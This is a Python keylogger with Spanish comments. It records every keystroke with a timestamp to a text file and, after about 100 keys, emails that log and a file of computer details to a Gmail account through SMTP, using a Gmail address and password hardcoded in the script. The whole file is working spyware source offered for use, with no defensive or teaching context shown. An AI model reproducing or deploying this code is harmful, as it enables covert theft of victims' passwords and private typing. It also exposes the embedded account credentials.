import pynput.keyboard 
#es necesaria la instalacion de la libreria con pip
#libreria para el envio de correo
import smtplib 
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from datetime import datetime #libreria para el tiempo

class keylogger:
	def __init__(self,email,password):#metodo que contiene las variables de la clase
		self.email=email					#variable que contiene el correo 
		self.password=password				#variable que contiene la contrasenia del correo
		self.cont=0							#variable que indica las teclas que se han presionado

	def process_key_press(self,key):#metodo donde se guardan las teclas presionadas
		hora=datetime.now()					#se almacena la fecha y hora de la tecla presionada
		try:
			current_key = str(key.char)#se intenta conventir las teclas en valores alfanumericos

		except AttributeError:
			current_key = str(key)#si no se pudieron convertir se mantienen como string
		
		f=open('reporte.txt','a')#se abre el archivo txt donde se guardaran las teclas
		f.write(hora.strftime("%d-%b-%Y (%H:%M:%S.%f)")+" "+ current_key+"\n")#se da el formato de la linea a guardarse en el txt
		f.close()#se termina de leer el archivo txt
		self.cont=self.cont + 1#aumenta el contador por tecla almacenada

	

	def send_mail(self, email, password):#metodo para enviar el txt por correo
		
		#anadiendo datos del computador al correo
		cuerpo=""#cuerpo del correo
		archivito=open("datos.txt","r")
		for linea in archivito.readlines():
			cuerpo=cuerpo+linea+"\n"
		archivito.close()

		asunto = 'Reporte Keylogger'  #nombre del asunto
		ruta_adjunto = 'reporte.txt' #ruta del archivo
		nombre_adjunto = 'reporte.txt' #nombre del archivo

		
		mensaje = MIMEMultipart()# Creamos el objeto mensaje
		 
		# Establecemos los atributos del mensaje
		mensaje['From'] = email
		mensaje['To'] = email
		mensaje['Subject'] = asunto
		 
		
		mensaje.attach(MIMEText(cuerpo, 'plain'))# Agregamos el cuerpo del mensaje como objeto MIME de tipo texto
		archivo_adjunto = open(ruta_adjunto, 'rb') # Abrimos el archivo que vamos a adjuntar
		adjunto_MIME = MIMEBase('application', 'octet-stream')# Creamos un objeto MIME base
		adjunto_MIME.set_payload((archivo_adjunto).read())# Y le cargamos el archivo adjunto
		encoders.encode_base64(adjunto_MIME)# Codificamos el objeto en BASE64
		adjunto_MIME.add_header('Content-Disposition', "attachment; filename= %s" % nombre_adjunto)# Agregamos una cabecera al objeto
		mensaje.attach(adjunto_MIME)		# Y finalmente lo agregamos al mensaje
		server= smtplib.SMTP("smtp.gmail.com", 587)# Creamos la conexión con el servidor
		server.starttls()# Ciframos la conexión
		server.login(email, password)# Iniciamos sesión en el servidor
		texto = mensaje.as_string()# Convertimos el objeto mensaje a texto
		server.sendmail(email,email,texto)# Enviamos el mensaje
		server.quit()# Cerramos la conexión
		print("Correo enviado exitosamente")	


	def start(self): #funcion donde se va correr el listener que escucha al teclado y que utiliza la funcion sendmail

		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press) #el programa capta todas las teclas presionadas
		with keyboard_listener:
			while True:
				if self.cont>100:#si supera las 100 lineas, se envia el correo
					self.send_mail(self.email, self.password)# envio el correo		
					self.cont=0#contador vuelve a cero
			keyboard_listener.join() 


my_keylogger = keylogger('alvacastcruzpach@gmail.com','pachcruzcastalva') #se instancia la clase keylogger
my_keylogger.start() #se inica la clase keylogger
